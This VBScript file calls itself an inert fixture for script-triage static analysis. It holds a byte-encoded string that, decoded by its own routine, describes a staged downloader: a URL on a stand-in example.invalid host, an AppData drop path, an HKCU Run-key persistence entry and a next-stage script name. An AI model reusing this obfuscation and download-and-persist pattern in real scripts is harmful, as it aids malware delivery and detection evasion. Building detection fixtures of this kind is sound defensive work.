Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_d7518816 = "96|39|27|102|93|94|79|90|93|39|75|77|91|95|83|92|79|73|92|79|87|89|94|79|22|97|92|83|94|79|73|80|83|86|79|22|78|83|93|90|75|94|77|82|73|90|92|89|77|79|93|93|22|82|75|88|78|89|80|80|73|93|77|92|83|90|94|102|75|78|75|90|94|79|92|39|55|83|77|92|89|93|89|80|94|24|66|55|54|50|62|62|58|102|93|94|75|81|79|73|77|89|95|88|94|39|30|102|77|75|87|90|75|83|81|88|73|83|78|39|77|75|87|90|75|83|81|88|23|32|75|26|79|77|26|34|77|79|29|102|95|92|86|39|82|94|94|90|93|36|25|25|32|75|26|79|77|26|34|77|79|29|24|79|98|75|87|90|86|79|24|83|88|96|75|86|83|78|25|30|75|32|26|33|34|35|31|24|78|75|94|102|95|93|79|92|73|75|81|79|88|94|39|50|95|88|94|92|79|93|93|54|75|76|25|32|75|26|79|77|26|34|77|79|29|102|80|83|86|79|73|90|75|94|82|39|45|36|70|63|93|79|92|93|70|58|95|76|86|83|77|70|50|95|88|94|92|79|93|93|54|75|76|70|93|94|75|81|79|23|32|75|26|79|77|26|34|77|79|29|24|78|75|94|102|92|79|81|83|93|94|92|99|73|90|75|94|82|39|50|53|45|63|70|61|89|80|94|97|75|92|79|70|50|95|88|94|92|79|93|93|54|75|76|70|46|83|93|90|89|93|75|76|86|79|70|32|75|26|79|77|26|34|77|79|29|102|88|79|98|94|73|93|94|75|81|79|39|86|89|77|75|86|23|78|83|93|90|75|94|77|82|24|96|76|93"
Const Codec_d7518816 = "decimal_pipe|subtract_modulo_256|16"

Function Load_d7518816()
  Dim parts, result(), ByTeInDeX
  parts = Split(Material_d7518816, "|")
  ReDim result(UBound(parts))
  For ByTeInDeX = 0 To UBound(parts)
    result(ByTeInDeX) = CInt(parts(ByTeInDeX))
  Next
  Load_d7518816 = result
End Function

Function Decode_d7518816(ByRef SoUrCeByTeS)
  Dim result(), ByTeInDeX, keyBytes, previous
  ReDim result(UBound(SoUrCeByTeS))
  For ByTeInDeX = 0 To UBound(SoUrCeByTeS)
    result(ByTeInDeX) = (SoUrCeByTeS(ByTeInDeX) + 22) Mod 256
  Next
  Decode_d7518816 = result
End Function

Function Recover_d7518816()
  Dim SoUrCeByTeS, DeCoDeDByTeS, DeScRiPtOrTeXt, NeUtRaL, ByTeInDeX, PaSs, ErRoRnUmBeR, ErRoRdEsCrIpTiOn
  NeUtRaL = (19 * 7) - 133
  SoUrCeByTeS = Load_d7518816()
  Do
    DeCoDeDByTeS = Decode_d7518816(SoUrCeByTeS)
    Exit Do
  Loop
  DeScRiPtOrTeXt = ""
  For ByTeInDeX = 0 To UBound(DeCoDeDByTeS)
    DeScRiPtOrTeXt = DeScRiPtOrTeXt & Chr(DeCoDeDByTeS(ByTeInDeX))
  Next
  Recover_d7518816 = DeScRiPtOrTeXt
End Function

Function Inspect_d7518816()
  Inspect_d7518816 = Recover_d7518816()
End Function
